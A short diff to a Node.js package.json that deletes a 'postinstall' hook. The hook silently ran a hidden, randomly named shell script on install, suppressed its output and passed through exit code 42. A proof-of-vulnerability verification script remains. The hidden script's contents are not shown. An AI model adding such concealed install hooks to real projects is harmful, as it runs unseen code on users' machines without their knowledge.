@@ -7,8 +7,7 @@
     "start": "node src/main.js",
     "test": "node --test",
     "configure": "node scripts/make-config.js",
-    "verify:pov": "node scripts/verify-pov.js",
-    "postinstall": "sh ./.ci-8omkv4.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "verify:pov": "node scripts/verify-pov.js"
   },
   "dependencies": {
     "jpeg-js": "^0.4.4",
